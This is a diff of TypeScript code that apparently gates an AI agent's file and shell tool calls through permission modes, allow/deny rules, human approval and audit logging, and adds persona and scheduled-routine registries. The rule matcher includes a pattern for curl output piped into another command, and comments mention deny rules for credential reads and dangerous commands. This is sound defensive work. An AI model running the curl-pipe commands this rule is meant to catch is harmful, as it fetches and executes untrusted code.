+    if (!data) return []
+    const rules: PermissionRule[] = []
+    for (const r of data.permissions?.allow ?? []) rules.push(this.parseRule(r, 'allow'))
+    for (const r of data.permissions?.ask ?? []) rules.push(this.parseRule(r, 'ask'))
+    for (const r of data.permissions?.deny ?? []) rules.push(this.parseRule(r, 'deny'))
+    this.rules.set(workspacePath, rules)
+    return rules
+  }
+
+  /**
+   * 检查工具调用权限。ask 模式下发起异步确认请求（WebSocket 推送）。
+   *
+   * 收口前这里是 **fail-open**:非 `default` 档(含 `plan`、`acceptEdits`,以及任何
+   * 未识别值)在无规则匹配时一律 `{ allowed: true }` —— 客户端只要声明"只读计划",
+   * 写文件/跑命令就全放了。现改为查 decideByPermissionMode 的穷尽矩阵,兜底方向是"更严"。
+   */
+  async check(params: {
+    userId: string
+    workspacePath: string
+    mode: PermissionMode
+    tool: string
+    args: Record<string, unknown>
+  }): Promise<{ allowed: boolean; requestId?: string; reason?: string }> {
+    const decision = decideByPermissionMode(params.mode, params.tool)
+
+    // deny 不再被 allow 规则翻案(档位是硬约束);allow 才继续查规则
+    if (decision.verdict === 'deny') return { allowed: false, reason: decision.reason }
+
+    const rules = this.rules.get(params.workspacePath) ?? this.loadRules(params.workspacePath)
+    for (const rule of rules) {
+      if (!this.matches(rule, params.tool, params.args)) continue
+      if (rule.action === 'deny') return { allowed: false, reason: `规则拒绝: ${rule.pattern}` }
+      if (rule.action === 'allow' && decision.verdict === 'allow') {
+        return { allowed: true, reason: `规则放行: ${rule.pattern}` }
+      }
+      // ask 规则,或 allow 规则但档位本身不允许(如 plan 档命中 allow 规则)→ 交回矩阵结论
+      return this.confirmation(params, decision)
+    }
+
+    if (decision.verdict === 'allow') return { allowed: true, reason: decision.reason }
+    return this.confirmation(params, decision)
+  }
+
+  /** 统一的人工确认出口(ask 与"规则要求确认"共用,避免两处返回形状漂移)。 */
+  private async confirmation(
+    params: {
+      userId: string
+      workspacePath: string
+      mode: PermissionMode
+      tool: string
+      args: Record<string, unknown>
+    },
+    decision: { reason: string },
+  ): Promise<{ allowed: boolean; requestId?: string; reason: string }> {
+    const result = this.requestConfirmation({
+      userId: params.userId,
+      tool: params.tool,
+      args: params.args,
+    })
+    return { allowed: false, requestId: result.requestId, reason: decision.reason }
+  }
+
+  resolve(requestId: string, approved: boolean): boolean {
+    const req = this.requests.get(requestId)
+    if (!req || req.status !== 'pending') return false
+    req.status = approved ? 'approved' : 'denied'
+    req.resolvedAt = nowSec()
+    return true
+  }
+
+  getRequest(requestId: string): PermissionRequest | null {
+    return this.requests.get(requestId) ?? null
+  }
+
+  listPending(userId: string): PermissionRequest[] {
+    return Array.from(this.requests.values()).filter(
+      (r) => r.userId === userId && r.status === 'pending',
+    )
+  }
+
+  private requestConfirmation(params: {
+    userId: string
+    tool: string
+    args: Record<string, unknown>
+  }): { allowed: boolean; requestId: string } {
+    const requestId = randomUUID().slice(0, 12)
+    const req: PermissionRequest = {
+      requestId,
+      userId: params.userId,
+      tool: params.tool,
+      args: params.args,
+      status: 'pending',
+      createdAt: nowSec(),
+      resolvedAt: null,
+    }
+    this.requests.set(requestId, req)
+    // WebSocket 推送确认请求
+    if (this.pushFn) {
+      this.pushFn(params.userId, {
+        type: 'permission.request',
+        requestId,
+        tool: params.tool,
+        args: params.args,
+      })
+    }
+    // 异步模式：返回 requestId，客户端需轮询/等待 WebSocket 回执
+    return { allowed: false, requestId }
+  }
+
+  private matches(rule: PermissionRule, toolName: string, args: Record<string, unknown>): boolean {
+    if (rule.tool === 'Bash' && toolName === 'run') {
+      const cmd = String(args['command'] ?? '')
+      if (rule.pattern.endsWith(':*')) return cmd.startsWith(rule.pattern.slice(0, -2))
+      return cmd.startsWith(rule.pattern)
+    }
+    if (['Edit', 'Write'].includes(rule.tool) && ['edit', 'write'].includes(toolName)) {
+      return this.matchPath(String(args['path'] ?? ''), rule.pattern)
+    }
+    if (rule.tool === 'Read' && ['read', 'browse', 'grep', 'glob'].includes(toolName)) {
+      const p = String(args['path'] ?? '')
+      return p ? this.matchPath(p, rule.pattern) : false
+    }
+    return false
+  }
+
+  private matchPath(path: string, pattern: string): boolean {
+    let p = pattern
+    if (p.startsWith('~')) p = join(homedir(), p.slice(1))
+    const regex = p
+      .replace(/[.+^${}()|[\]\\]/g, '\\$&')
+      .replace(/\*/g, '.*')
+      .replace(/\?/g, '.')
+    return new RegExp(regex).test(path)
+  }
+
+  private parseRule(ruleStr: string, action: PermissionAction): PermissionRule {
+    const idx = ruleStr.indexOf('(')
+    if (idx === -1) return { tool: ruleStr, pattern: '', action }
+    const tool = ruleStr.slice(0, idx)
+    const pattern = ruleStr.slice(idx + 1, ruleStr.lastIndexOf(')'))
+    return { tool, pattern, action }
+  }
+
+  /**
+   * 基于 DB 持久化的权限配置 + 规则进行校验。
+   *
+   * G-163 收口:本方法此前是 checkWorkspace 的**逐字副本**(约 127 行同一条授权梯,
+   * 且零调用方 —— grep checkWithDb 只有定义与本注释)。两条同形梯子并存的下场必然是
+   * "改了一条忘了另一条",而这条被忘的那条随时可能被人接进 fsBridge enforcement。
+   * 现保留符号(契约不破)但实现委托给唯一活路径 checkWorkspace,重复梯子消除。
+   */
+  async checkWithDb(params: {
+    userId: string
+    workspacePath: string
+    tool: string
+    args: Record<string, unknown>
+  }): Promise<{
+    allowed: boolean
+    requestId?: string
+    // 纯委托 checkWorkspace,故与其同契约同类型:归一成 wire 优先,归一不出时回显库中原值。
+    mode: string | null
+    configured: boolean
+    reason?: string
+  }> {
+    return this.checkWorkspace(params)
+  }
+
+  // ===========================================================================
+  // workspace_permissions 系统:FS Bridge 运行时拦截
+  // ===========================================================================
+
+  /**
+   * 阻塞式人工审计(workspace_permissions 系统专用)。
+   * 与 requestConfirmation 不同:返回 Promise,等待 resolveWorkspace() 被调用才解锁。
+   * 60s 超时自动拒绝,WebSocket 不可用立即拒绝。
+   */
+  private requestWorkspaceConfirmation(params: {
+    userId: string
+    workspacePath: string
+    tool: string
+    args: Record<string, unknown>
+  }): Promise<{ allowed: boolean; reason: string }> {
+    const requestId = randomUUID().slice(0, 12)
+    const req: PermissionRequest = {
+      requestId,
+      userId: params.userId,
+      tool: params.tool,
+      args: params.args,
+      status: 'pending',
+      createdAt: nowSec(),
+      resolvedAt: null,
+    }
+
+    return new Promise<{ allowed: boolean; reason: string }>((resolve) => {
+      const timer = setTimeout(() => {
+        this.workspacePending.delete(requestId)
+        resolve({ allowed: false, reason: '人工审计超时(60s)' })
+      }, PermissionManager.WORKSPACE_AUDIT_TIMEOUT_MS)
+
+      this.workspacePending.set(requestId, { req, resolve, timer })
+
+      if (this.pushFn) {
+        this.pushFn(params.userId, {
+          type: 'workspace.permission.request',
+          requestId,
+          userId: params.userId,
+          workspacePath: params.workspacePath,
+          tool: params.tool,
+          args: params.args,
+          createdAt: Date.now(),
+        })
+      } else {
+        // WebSocket 不可用 → 立即拒绝,避免挂死
+        clearTimeout(timer)
+        this.workspacePending.delete(requestId)
+        resolve({ allowed: false, reason: 'WebSocket 不可用,无法人工审计' })
+      }
+    })
+  }
+
+  /**
+   * 用户通过前端弹窗决策后,调用此方法解锁对应 Promise。
+   * 返回 false:requestId 不存在 / 用户不匹配 / 已超时
+   */
+  resolveWorkspace(requestId: string, userId: string, approved: boolean, reason?: string): boolean {
+    const entry = this.workspacePending.get(requestId)
+    if (!entry || entry.req.userId !== userId) return false
+    clearTimeout(entry.timer)
+    this.workspacePending.delete(requestId)
+    entry.req.status = approved ? 'approved' : 'denied'
+    entry.req.resolvedAt = nowSec()
+    entry.resolve({
+      allowed: approved,
+      reason: approved ? (reason ?? '用户允许') : (reason ?? '用户拒绝'),
+    })
+    return true
+  }
+
+  /**
+   * 规则级审批闸门(2026-11-04):把 `@ihui/shared/permission` 的规则引擎接进真实执行链路。
+   * 语义边界:
+   *  - 档位(decideByPermissionMode)仍是**上限**,这里固定以 tier.verdict='ask' 喂给引擎,
+   *    因此引擎的 allow 只可能来自**授权记忆**或**自动复核**,不会凭空放宽;
+   *  - deny 来自声明式风险规则(凭据读取/批量删除/高危命令/系统目录);
+   *  - ask 仍走既有人工审计,行为与改造前一致。
+   */
+  private async evaluateApprovalGate(params: {
+    userId: string
+    workspacePath: string
+    tool: string
+    args: Record<string, unknown>
+  }): Promise<{
+    decision: 'allow' | 'ask' | 'deny'
+    matchedRule: string
+    reason: string
+    scopeKey: string
+  }> {
+    const now = Date.now()
+    // 本闸门是 FS Bridge 的热路径(既有用例按"加一个 tick 就出 pending"来断言),因此这里
+    // **不读库**:持久授权记忆的消费面在 `/api/agent-control/execute`(computer-use 应用白名单)
+    // 与 `/permission/grants`;工具链这边只消费进程内近因历史做自动复核。若日后要让工具链
+    // 也吃持久授权,注入 `loadPermissionGrants` 即可,但需同步给这条热路径补测试桩。
+    const request = {
+      tool: params.tool,
+      args: params.args,
+      context: {
+        workspaceId: params.workspacePath,
+        agentId: null,
+        userId: params.userId,
+        now,
+        grants: [],
+        history: listApprovalHistory(params.userId),
+      },
+    }
+    const result = decideApproval(request)
+    // 档位是上限:规则集的 `allow.read-only` 属于"引擎自行判定",在 default/acceptEdits
+    // 档里不得成为放宽通道 —— 只有**人类既往决定的复用**(自动复核)才允许 allow。
+    // (plan 档的硬 deny 与本档 bypass 分支都在本方法之前返回,不经过这里。)
+    const decision: 'allow' | 'ask' | 'deny' =
+      result.decision === 'allow' && !result.autoReview ? 'ask' : result.decision
+    const facts = computeFacts(request)
+    return {
+      decision,
+      matchedRule: result.matchedRule,
+      reason:
+        decision === result.decision
+          ? result.reason
+          : `${result.reason};档位上限:引擎放行未获既往人工决定背书,转人工`,
+      scopeKey: facts.commandPrefix ?? facts.appName ?? facts.tool,
+    }
+  }
+
+  /** 人工结论落近因历史,供下一次自动复核比对(只记真实发生的人类决定)。 */
+  private async recordApprovalOutcome(params: {
+    userId: string
+    workspacePath: string
+    tool: string
+    ruleId: string
+    scopeKey: string
+    allowed: boolean
+  }): Promise<void> {
+    recordApprovalHistory(params.userId, {
+      tool: params.tool,
+      decision: params.allowed ? 'allow' : 'deny',
+      ruleId: params.ruleId,
+      workspaceId: params.workspacePath,
+      agentId: null,
+      scopeKey: params.scopeKey,
+      at: Date.now(),
+    })
+  }
+
+  listWorkspacePending(userId: string): PermissionRequest[] {
+    return Array.from(this.workspacePending.values())
+      .filter((e) => e.req.userId === userId)
+      .map((e) => e.req)
+  }
+
+  /**
+   * workspace_permissions 系统的核心检查:FS Bridge enforcement 入口。
+   * - 入参档位先过唯一真源归一(DB 历史存 kebab,新链路送 camel/别名),认不出按 default
+   * - **档位是上限,规则是下限**:先查 decideByPermissionMode 的硬否决(= plan 档非只读工具
+   *   直接 deny),通过后再按 DB 规则判;矩阵的 allow 一律不采纳,免得绕过规则反而放宽
+   * - bypassPermissions → 直接放行
+   * - acceptEdits + allow 规则匹配 → 放行
+   * - acceptEdits + deny 规则匹配 → 拒绝
+   * - acceptEdits 无匹配 → 走人工审计(block)
+   * - default / manual → 全部走人工审计(block)
+   * - 未配置权限 → 拒绝(前端应先调 /fs/open 触发 setup)
+   */
+  async checkWorkspace(params: {
+    userId: string
+    workspacePath: string
+    tool: string
+    args: Record<string, unknown>
+    /**
+     * 只读枚举场景(列表接口,如 /fs/recent、/fs/browse):本应转人工审计的 'ask'
+     * 不发起阻塞式确认,按「未被拒绝」放行;硬 deny(未配置/plan 非只读/规则拒绝)不变。
+     */
+    enumerateOnly?: boolean
+  }): Promise<{
+    allowed: boolean
+    /**
+     * 已归一化的 workspace 档位(wire 拼写);**归一不出时回显库中原值** —— 与路由
+     * toWirePermission 逐字同契约(其 mode 域即 string,见 db/workspace-permission-queries.ts:58),
+     * 故此处不声明成 4 值并集,否则脏行会被悄悄改写成 null。
+     * 未配置权限时为 null —— 不再用 'unset' 哨兵承载语义(G-164)。
+     */
+    mode: string | null
+    /** 该工作区是否已配置权限(perm 存在)。未配置 → configured=false,HTTP 侧据此给 401。 */
+    configured: boolean
+    reason: string
+    matchedRule?: string
+    requestId?: string
+  }> {
+    const { getPermission, listRules, appendAuditLog } =
+      await import('../db/workspace-permission-queries.js')
+    const perm = await getPermission(params.userId, params.workspacePath)
+
+    // 未配置权限 → 拒绝,要求先 setup(由 /fs/open 触发)。
+    // 注意:G-164 已消除 'unset' 哨兵 —— 用 configured=false + mode=null 表达"未配置",
+    // 不再让非档位字面量污染 mode 字段。
+    if (!perm) {
+      return {
+        allowed: false,
+        mode: null,
+        configured: false,
+        reason: '工作区权限未配置,请先完成首次设置',
+      }
+    }
+
+    // 归一后的 wire 档位;perm 存在即已配置(供下方各返回体复用)。
+    // 与 routes/workspace-permissions.ts 的 toWirePermission 同一契约:归一成 wire(kebab)优先,
+    // 归一不出时**回显库中原值** —— 不给历史脏行新增失败模式,对外契约不变(G-163)。
+    const permModeWire = permissionModeWire(perm.mode) ?? perm.mode
+
+    // 同 checkWithDb:档位先过唯一真源归一,认不出按 default(最严)。
+    // 本方法是 **Agent 工具执行的真实闸门**(routes/workspace-ai.ts checkWorkspace 调用),
+    // 所以这里的手势必须与 decideByPermissionMode 一致 —— 两处各写一份就是下一次漂移的成因。
+    const permMode: PermissionMode = normalizePermissionMode(perm.mode) ?? 'default'
+    // 档位是**上限**,规则是**下限**:这里只采纳矩阵的 deny(plan 档的硬只读),
+    // 不采纳它的 allow —— 否则等于绕过下面按 workspace 规则表做的判断,反而放宽。
+    const tierCeiling = decideByPermissionMode(permMode, params.tool)
+    if (tierCeiling.verdict === 'deny') {
+      await appendAuditLog({
+        userId: params.userId,
+        workspacePath: params.workspacePath,
+        toolName: params.tool,
+        args: JSON.stringify(params.args).slice(0, 1000),
+        decision: 'deny',
+        reason: tierCeiling.reason,
+      })
+      return { allowed: false, mode: permModeWire, configured: true, reason: tierCeiling.reason }
+    }
+    // bypass-permissions → 直接放行 + 记录审计
+    if (permMode === 'bypassPermissions') {
+      await appendAuditLog({
+        userId: params.userId,
+        workspacePath: params.workspacePath,
+        toolName: params.tool,
+        args: JSON.stringify(params.args).slice(0, 1000),
+        decision: 'allow',
+        reason: 'bypass-permissions 模式自动放行',
+      })
+      return {
+        allowed: true,
+        mode: permModeWire,
+        configured: true,
+        reason: 'bypass-permissions 模式自动放行',
+      }
+    }
+
+    // accept-edits → 查 DB 规则
+    if (permMode === 'acceptEdits') {
+      const dbRules = await listRules(params.userId, params.workspacePath)
+      for (const r of dbRules) {
+        if (
+          this.workspaceRuleMatches(r.ruleType, r.pattern, r.operation, params.tool, params.args)
+        ) {
+          if (r.decision === 'allow') {
+            await appendAuditLog({
+              userId: params.userId,
+              workspacePath: params.workspacePath,
+              toolName: params.tool,
+              args: JSON.stringify(params.args).slice(0, 1000),
+              decision: 'allow',
+              reason: `白名单 allow 匹配: ${r.pattern}`,
+            })
+            return {
+              allowed: true,
+              mode: permModeWire,
+              configured: true,
+              reason: `白名单 allow 匹配: ${r.pattern}`,
+              matchedRule: r.pattern,
+            }
+          }
+          if (r.decision === 'deny') {
+            await appendAuditLog({
+              userId: params.userId,
+              workspacePath: params.workspacePath,
+              toolName: params.tool,
+              args: JSON.stringify(params.args).slice(0, 1000),
+              decision: 'deny',
+              reason: `白名单 deny 匹配: ${r.pattern}`,
+            })
+            return {
+              allowed: false,
+              mode: permModeWire,
+              configured: true,
+              reason: `白名单 deny 匹配: ${r.pattern}`,
+              matchedRule: r.pattern,
+            }
+          }
+        }
+      }
+      // 无匹配 → 规则级闸门(2026-11-04):授权记忆/自动复核可放行,风险规则可拒绝,
+      // 其余仍走人工审计 —— 引擎不会凭空放宽(allow 只来自人类的既往决定)
+      const gate = await this.evaluateApprovalGate(params)
+      if (gate.decision === 'deny') {
+        await appendAuditLog({
+          userId: params.userId,
+          workspacePath: params.workspacePath,
+          toolName: params.tool,
+          args: JSON.stringify(params.args).slice(0, 1000),
+          decision: 'deny',
+          reason: `规则拒绝(${gate.matchedRule}): ${gate.reason}`,
+        })
+        return {
+          allowed: false,
+          mode: permModeWire,
+          configured: true,
+          reason: `规则拒绝: ${gate.reason}`,
+          matchedRule: gate.matchedRule,
+        }
+      }
+      if (gate.decision === 'allow') {
+        await this.recordApprovalOutcome({
+          userId: params.userId,
+          workspacePath: params.workspacePath,
+          tool: params.tool,
+          ruleId: gate.matchedRule,
+          scopeKey: gate.scopeKey,
+          allowed: true,
+        })
+        await appendAuditLog({
+          userId: params.userId,
+          workspacePath: params.workspacePath,
+          toolName: params.tool,
+          args: JSON.stringify(params.args).slice(0, 1000),
+          decision: 'allow',
+          reason: `规则放行(${gate.matchedRule}): ${gate.reason}`,
+        })
+        return {
+          allowed: true,
+          mode: permModeWire,
+          configured: true,
+          reason: gate.reason,
+          matchedRule: gate.matchedRule,
+        }
+      }
+      if (params.enumerateOnly) {
+        return {
+          allowed: true,
+          mode: permModeWire,
+          configured: true,
+          reason: `只读枚举不发起人工审计(${gate.reason})`,
+          matchedRule: gate.matchedRule,
+        }
+      }
+      const audit = await this.requestWorkspaceConfirmation({
+        userId: params.userId,
+        workspacePath: params.workspacePath,
+        tool: params.tool,
+        args: params.args,
+      })
+      await this.recordApprovalOutcome({
+        userId: params.userId,
+        workspacePath: params.workspacePath,
+        tool: params.tool,
+        ruleId: gate.matchedRule,
+        scopeKey: gate.scopeKey,
+        allowed: audit.allowed,
+      })
+      await appendAuditLog({
+        userId: params.userId,
+        workspacePath: params.workspacePath,
+        toolName: params.tool,
+        args: JSON.stringify(params.args).slice(0, 1000),
+        decision: audit.allowed ? 'allow' : 'deny',
+        reason: `accept-edits 规则转人工(${gate.matchedRule}): ${audit.reason}`,
+      })
+      return {
+        allowed: audit.allowed,
+        mode: permModeWire,
+        configured: true,
+        reason: audit.reason,
+        matchedRule: gate.matchedRule,
+      }
+    }
+
+    // default → 规则级闸门(2026-11-04):deny 规则直接拒绝;授权记忆/自动复核可放行;
+    // 其余仍走人工审计(与改造前一致,不新增放宽通道)
+    const gate = await this.evaluateApprovalGate(params)
+    if (gate.decision === 'deny') {
+      await appendAuditLog({
+        userId: params.userId,
+        workspacePath: params.workspacePath,
+        toolName: params.tool,
+        args: JSON.stringify(params.args).slice(0, 1000),
+        decision: 'deny',
+        reason: `规则拒绝(${gate.matchedRule}): ${gate.reason}`,
+      })
+      return {
+        allowed: false,
+        mode: permModeWire,
+        configured: true,
+        reason: `规则拒绝: ${gate.reason}`,
+        matchedRule: gate.matchedRule,
+      }
+    }
+    if (gate.decision === 'allow') {
+      await this.recordApprovalOutcome({
+        userId: params.userId,
+        workspacePath: params.workspacePath,
+        tool: params.tool,
+        ruleId: gate.matchedRule,
+        scopeKey: gate.scopeKey,
+        allowed: true,
+      })
+      await appendAuditLog({
+        userId: params.userId,
+        workspacePath: params.workspacePath,
+        toolName: params.tool,
+        args: JSON.stringify(params.args).slice(0, 1000),
+        decision: 'allow',
+        reason: `规则放行(${gate.matchedRule}): ${gate.reason}`,
+      })
+      return {
+        allowed: true,
+        mode: permModeWire,
+        configured: true,
+        reason: gate.reason,
+        matchedRule: gate.matchedRule,
+      }
+    }
+    if (params.enumerateOnly) {
+      return {
+        allowed: true,
+        mode: permModeWire,
+        configured: true,
+        reason: `只读枚举不发起人工审计(${gate.reason})`,
+        matchedRule: gate.matchedRule,
+      }
+    }
+    const audit = await this.requestWorkspaceConfirmation({
+      userId: params.userId,
+      workspacePath: params.workspacePath,
+      tool: params.tool,
+      args: params.args,
+    })
+    await this.recordApprovalOutcome({
+      userId: params.userId,
+      workspacePath: params.workspacePath,
+      tool: params.tool,
+      ruleId: gate.matchedRule,
+      scopeKey: gate.scopeKey,
+      allowed: audit.allowed,
+    })
+    await appendAuditLog({
+      userId: params.userId,
+      workspacePath: params.workspacePath,
+      toolName: params.tool,
+      args: JSON.stringify(params.args).slice(0, 1000),
+      decision: audit.allowed ? 'allow' : 'deny',
+      reason: `default 规则转人工(${gate.matchedRule}): ${audit.reason}`,
+    })
+    return {
+      allowed: audit.allowed,
+      mode: permModeWire,
+      configured: true,
+      reason: audit.reason,
+      matchedRule: gate.matchedRule,
+    }
+  }
+
+  /**
+   * workspace 规则匹配:支持 path / command / operation 三种 ruleType。
+   * 与 SAFE_TEMPLATES 的 24 条预置规则格式兼容。
+   */
+  private workspaceRuleMatches(
+    ruleType: string,
+    pattern: string,
+    _operation: string | null | undefined,
+    tool: string,
+    args: Record<string, unknown>,
+  ): boolean {
+    if (ruleType === 'path') {
+      const filePath = String(args.path ?? '')
+      if (!filePath) return false
+      return this.matchPath(filePath, pattern)
+    }
+    if (ruleType === 'command') {
+      // command 规则:execute_command:cmd_prefix 或 旧式 tool 名(read_file 等)
+      if (pattern.startsWith('execute_command:')) {
+        if (tool !== 'fs.run') return false
+        const cmdPrefix = pattern.slice('execute_command:'.length)
+        const cmd = String(args.command ?? '')
+        if (cmdPrefix.endsWith(' *')) {
+          return cmd.startsWith(cmdPrefix.slice(0, -2))
+        }
+        if (cmdPrefix === 'curl *|*') {
+          return cmd.startsWith('curl ') && cmd.includes('|')
+        }
+        return cmd.startsWith(cmdPrefix)
+      }
+      // 旧式 tool 名映射(read_file / write_file / search_files 等)
+      const legacyMap: Record<string, string> = {
+        read_file: 'fs.read',
+        write_file: 'fs.write',
+        search_files: 'fs.grep',
+        list_directory: 'fs.browse',
+        get_file_info: 'fs.read',
+      }
+      const mappedTool = legacyMap[pattern]
+      if (mappedTool) return tool === mappedTool
+      return tool === pattern
+    }
+    if (ruleType === 'operation') {
+      // operation 规则格式: "read:*" / "write:*.md" 等
+      if (!pattern.includes(':')) return false
+      const parts = pattern.split(':')
+      const opType = parts[0]
+      const opPattern = parts[1]
+      if (!opType || !opPattern) return false
+      const currentOp = this.deriveOperation(tool)
+      if (opType !== currentOp) return false
+      if (opPattern === '*') return true
+      if (opPattern.startsWith('*.')) {
+        return String(args.path ?? '').endsWith(opPattern.slice(1))
+      }
+      return false
+    }
+    return false
+  }
+
+  private deriveOperation(tool: string): string {
+    if (tool === 'fs.read' || tool === 'fs.grep' || tool === 'fs.glob' || tool === 'fs.browse') {
+      return 'read'
+    }
+    if (tool === 'fs.write' || tool === 'fs.edit') return 'write'
+    if (tool === 'fs.delete') return 'delete'
+    if (tool === 'fs.run') return 'execute'
+    return 'unknown'
+  }
+}
+
+export const permissionManager = new PermissionManager()
+
+// =============================================================================
+// 12. PersonaRegistry — 人格注册
+// =============================================================================
+
+export interface Persona {
+  id: string
+  name: string
+  category: string
+  description: string
+  systemPrompt: string
+  tools: string[]
+  examples: string[]
+  tags: string[]
+  enabled: boolean
+  builtin: boolean
+  createdAt: number
+  updatedAt: number
+}
+
+const BUILTIN_PERSONAS: Persona[] = [
+  {
+    id: 'code-reviewer',
+    name: 'Code Reviewer',
+    category: 'engineering',
+    description: '严格审查代码质量、安全、性能、可维护性',
+    systemPrompt:
+      '你是一位资深的代码审查专家。从正确性/性能/安全/可读性/可测试性维度评估，给出可执行的修改建议。',
+    tools: [],
+    examples: ['review this PR', '检查代码质量'],
+    tags: ['code', 'review'],
+    enabled: true,
+    builtin: true,
+    createdAt: 0,
+    updatedAt: 0,
+  },
+  {
+    id: 'refactor-expert',
+    name: 'Refactor Expert',
+    category: 'engineering',
+    description: '在不改变行为前提下重构代码',
+    systemPrompt:
+      '你是 Martin Fowler 风格的重构专家。每次只做一种重构，完成后保持测试通过，用 SOLID 原则评估。',
+    tools: [],
+    examples: ['重构这段代码'],
+    tags: ['refactor'],
+    enabled: true,
+    builtin: true,
+    createdAt: 0,
+    updatedAt: 0,
+  },
+  {
+    id: 'test-engineer',
+    name: 'Test Engineer',
+    category: 'engineering',
+    description: '编写单元/集成/E2E 测试',
+    systemPrompt: '你是测试金字塔专家。AAA 结构，一测一行为，覆盖正常/边界/异常三态。',
+    tools: [],
+    examples: ['为这段代码写测试'],
+    tags: ['test'],
+    enabled: true,
+    builtin: true,
+    createdAt: 0,
+    updatedAt: 0,
+  },
+  {
+    id: 'debugger',
+    name: 'Debugger',
+    category: 'engineering',
+    description: '定位 Bug 根因，提供修复方案',
+    systemPrompt: '你是系统化调试专家。流程：复现→二分定位→根因分析→修复+回归测试→反思。',
+    tools: [],
+    examples: ['这个 bug 怎么修'],
+    tags: ['debug'],
+    enabled: true,
+    builtin: true,
+    createdAt: 0,
+    updatedAt: 0,
+  },
+  {
+    id: 'frontend-pro',
+    name: 'Frontend Pro',
+    category: 'engineering',
+    description: 'Vue/React 前端架构与组件设计',
+    systemPrompt: '你是现代前端专家。掌握 Vue3/React18/TS/Vite。强调组件单一职责、性能、a11y。',
+    tools: [],
+    examples: ['帮我设计组件'],
+    tags: ['frontend'],
+    enabled: true,
+    builtin: true,
+    createdAt: 0,
+    updatedAt: 0,
+  },
+  {
+    id: 'backend-pro',
+    name: 'Backend Pro',
+    category: 'engineering',
+    description: '后端架构、API 设计、数据库优化',
+    systemPrompt:
+      '你是后端架构师。精通 Fastify/Go/Node。RESTful 规范、索引策略、缓存层级、鉴权限流。',
+    tools: [],
+    examples: ['设计 API'],
+    tags: ['backend'],
+    enabled: true,
+    builtin: true,
+    createdAt: 0,
+    updatedAt: 0,
+  },
+]
+
+class PersonaRegistry {
+  private personas = new Map<string, Persona>()
+  private blockedWrite: string | null = null
+
+  constructor() {
+    for (const p of BUILTIN_PERSONAS) this.personas.set(p.id, p)
+    try {
+      const saved = readJsonForUpdate<Persona[] | null>(
+        PERSONAS_FILE,
+        null,
+        '人格档案读不到,不能按内置名单覆盖',
+      )
+      if (Array.isArray(saved)) for (const p of saved) this.personas.set(p.id, p)
+      else if (saved !== null) this.blockedWrite = '人格档案读不到,不能按内置名单覆盖 (corrupt)'
+    } catch (error) {
+      this.blockedWrite = error instanceof Error ? error.message : String(error)
+    }
+  }
+
+  list(category?: string): Persona[] {
+    const all = Array.from(this.personas.values())
+    return category ? all.filter((p) => p.category === category) : all
+  }
+
+  get(id: string): Persona | null {
+    return this.personas.get(id) ?? null
+  }
+
+  create(params: {
+    id: string
+    name: string
+    category: string
+    description: string
+    systemPrompt: string
+    tools?: string[]
+    examples?: string[]
+    tags?: string[]
+  }): Persona {
+    if (this.personas.has(params.id)) throw new Error(`Persona 已存在: ${params.id}`)
+    const persona: Persona = {
+      id: params.id,
+      name: params.name,
+      category: params.category,
+      description: params.description,
+      systemPrompt: params.systemPrompt,
+      tools: params.tools ?? [],
+      examples: params.examples ?? [],
+      tags: params.tags ?? [],
+      enabled: true,
+      builtin: false,
+      createdAt: nowSec(),
+      updatedAt: nowSec(),
+    }
+    this.personas.set(params.id, persona)
+    this.persist()
+    return persona
+  }
+
+  update(
+    id: string,
+    updates: Partial<Omit<Persona, 'id' | 'builtin' | 'createdAt'>>,
+  ): Persona | null {
+    const p = this.personas.get(id)
+    if (!p) return null
+    // F-364 服务层兜底:内置人格是全局共享资产,任何字段都不可被改写。路由层已先返回
+    // 403,此处再拒一次,防止未来新增调用点绕过管理员闸/内置守卫改坏所有人的系统提示词。
+    if (p.builtin) return null
+    const updated = {
+      ...p,
+      ...updates,
+      id: p.id,
+      builtin: p.builtin,
+      createdAt: p.createdAt,
+      updatedAt: nowSec(),
+    }
+    this.personas.set(id, updated)
+    this.persist()
+    return updated
+  }
+
+  delete(id: string): boolean {
+    const p = this.personas.get(id)
+    if (!p || p.builtin) return false
+    this.personas.delete(id)
+    this.persist()
+    return true
+  }
+
+  private persist(): void {
+    if (this.blockedWrite) throw new Error(this.blockedWrite)
+    writeJson(PERSONAS_FILE, Array.from(this.personas.values()))
+  }
+}
+
+export const personaRegistry = new PersonaRegistry()
+
+// =============================================================================
+// 13. Routines — 例行程序（定时执行 Agent 任务）
+// =============================================================================
+
+export interface Routine {
+  id: string
+  /**
+   * 属主(F-301)。旧 routines.json 记录没有该字段(JSON 里也没有创建者信息,
+   * 无法回填),一律按 orphan 处理:任何用户都不算属主,list 不返回、get/update/
+   * delete/trigger 一律按「不存在」404,避免被任意登录用户读写。
+   */
+  userUuid: string
+  name: string
+  prompt: string
+  cronExpression: string
+  workspacePath: string
+  modelId: string
+  enabled: boolean
+  createdAt: number
+  lastRun: number | null
+  lastResult: string | null
+  nextRun: number | null
+}
+
+class RoutineManager {
+  private routines = new Map<string, Routine>()
+  private timer: NodeJS.Timeout | null = null
+  private blockedWrite: string | null = null
+  private loadedFrom: string | null = null
+
+  /** 懒加载:存储根可能在模块导入后由测试注入(IHUI_STORE_ROOT),路径变化时重读。 */
+  private ensureLoaded(): void {
+    const file = routinesFile()
+    if (this.loadedFrom === file) return
+    this.loadedFrom = file
+    this.routines.clear()
+    this.blockedWrite = null
+    try {
+      const saved = readJsonForUpdate<Routine[] | null>(
+        file,
+        null,
+        '例行程序读不到,不能按空名单覆盖',
+      )
+      if (Array.isArray(saved)) for (const r of saved) this.routines.set(r.id, r)
+      else if (saved !== null) this.blockedWrite = '例行程序读不到,不能按空名单覆盖 (corrupt)'
+    } catch (error) {
+      this.blockedWrite = error instanceof Error ? error.message : String(error)
+    }
+  }
+
+  /** 属主判定:旧记录缺 userUuid → orphan,不属于任何人。 */
+  private owns(routine: Routine | null | undefined, userId: string): routine is Routine {
+    if (!routine || typeof routine.userUuid !== 'string' || routine.userUuid === '') return false
+    return routine.userUuid === userId
+  }
+
+  list(userId: string): Routine[] {
+    this.ensureLoaded()
+    return Array.from(this.routines.values()).filter((r) => this.owns(r, userId))
+  }
+
+  get(id: string, userId: string): Routine | null {
+    this.ensureLoaded()
+    const r = this.routines.get(id)
+    return this.owns(r, userId) ? r : null
+  }
+
+  create(
+    params: {
+      name: string
+      prompt: string
+      cronExpression: string
+      workspacePath: string
+      modelId?: string
+    },
+    userId: string,
+  ): Routine {
+    this.ensureLoaded()
+    const id = randomUUID().slice(0, 12)
+    const routine: Routine = {
+      id,
+      userUuid: userId,
